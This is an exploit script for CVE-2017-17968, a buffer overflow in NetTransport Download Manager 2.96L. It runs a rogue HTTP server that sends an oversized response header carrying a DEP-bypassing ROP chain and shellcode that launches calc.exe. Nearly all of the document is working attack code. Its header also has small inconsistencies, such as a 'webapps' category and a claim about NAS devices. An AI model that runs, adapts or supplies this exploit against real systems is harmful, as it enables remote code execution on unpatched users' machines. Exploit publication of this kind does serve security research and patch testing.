#!/usr/bin/pythion

# Exploit Title: Buffer overflow in NetTransport Download Manager - Version 2.96L (DEP Bypass)
# CVE: CVE-2017-17968
# Date: 28-12-2017
# Software Link: http://xi-soft.com/downloads/NXSetup_x86.zip
# Exploit Author: Author: Aloyce J. Makalanga
# Contact: https://twitter.com/aloycemjr
# Vendor Homepage: http://xi-soft.com/default.htm
# Category: webapps
# Impact: Code execution
 
#1. Description
#   
#A buffer overflow vulnerability in NetTransport.exe in NetTransport Download Manager 2.96L and earlier could allow remote HTTP servers to execute arbitrary code on NAS devices via a long HTTP response. To exploit this vulnerability, an attacker needs to issue a malicious-crafted payload in the HTTP Response Header. A successful attack could result in code execution
#   
#2. Proof of Concept
 #

#!/usr/bin/pythion




def main():
    host = "192.168.205.131"
    port = 80

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print "\n[+] Listening on %d ..." % port

    cl, addr = s.accept()
    print "[+] Connection accepted from %s" % addr[0]

    #Disabling DEP by VirtualProtect()
    def create_rop_chain():
        # rop chain generated with mona.py - www.corelan.be
        rop_gadgets = [
            0x10001653,  # POP EAX # RETN [libssl.dll]
            0x00485ed3,# MOV EAX,DWORD PTR DS:[ECX] # POP EDI # POP ESI # POP EBP # POP ECX # RETN 0x04 [NetTransport.exe]
            0x41414141,  # Filler (compensate)
            0x41414141,  # Filler (compensate)
            0x41414141,  # Filler (compensate)
            0x41414141,  # Filler (compensate)
            0x00496596,  # XCHG EAX,ESI # RETN 0x0A [NetTransport.exe]
            0x41414141,  # Filler (RETN offset compensation)
            0x004ea919,  # POP EBP # RETN [NetTransport.exe]
            0x41414141,  # Filler (RETN offset compensation)
            0x41414141,  # Filler (RETN offset compensation)
            0x4141,  # Filler (RETN offset compensation)
            0x004608df,  # & push esp # ret  [NetTransport.exe]
            0x0045e75f,  # POP EBX # RETN [NetTransport.exe]
            0x00000201,  # 0x00000201-> ebx
            0x00554dbc,  # POP ECX # RETN [NetTransport.exe]
            0x00000040,  # 0x00000040-> edx
            0x00499c92,  # XOR EDX,EDX # RETN 0x04 [NetTransport.exe]
            0x0041254c,  # ADC EDX,ECX # POP EBX # ADD ESP,0C # RETN 0x04 [NetTransport.exe]
            0x41414141,  # Filler (RETN offset compensation)
            0x41414141,  # Filler (compensate)
            0x41414141,  # Filler (compensate)
            0x41414141,  # Filler (compensate)
            0x41414141,  # Filler (compensate)
            0x0054e559,  # POP ECX # RETN [NetTransport.exe]
            0x41414141,  # Filler (RETN offset compensation)
            0x10004b93,  # &Writable location [libssl.dll]
            0x0050343f,  # POP EDI # RETN [NetTransport.exe]
            0x00487073,  # RETN (ROP NOP) [NetTransport.exe]
            0x10001653,  # POP EAX # RETN [libssl.dll]
            0x90909090,  # nop
            0x00486f78,  # PUSHAD # RETN [NetTransport.exe]
        ]
        return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

    rop_chain = create_rop_chain()

    #Tiny calc.exe shellcode

    shellcode = (
            "\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9" +
            "\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56" +
            "\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9" +
            "\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97" +
            "\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64" +
            "\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8" +
            "\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a" +
            "\x1c\x39\xbd"
    )

    MaxSize = 60000
    EAX_overwrite= "A"*16739 #Always trigger a crash at EAX

    #EIP 004E7828
    #evil = "\x28\x78\x4E\x90"

    rop = rop_chain
    nops = "\x90"*10
    pads = "C"*(MaxSize - len(EAX_overwrite + rop + nops + shellcode))
    payload = EAX_overwrite + rop + nops + shellcode + pads

    buffer = "HTTP/1.1 200 " + payload + "\r\n"

    print cl.recv(1000)
    cl.send(buffer)
    print "[+] Sending buffer: OK\n"


    cl.close()
    s.close()

if __name__ == '__main__':
    import struct
    import socket
    main()


   
#3. Solution:
#   
#No solution available at the moment.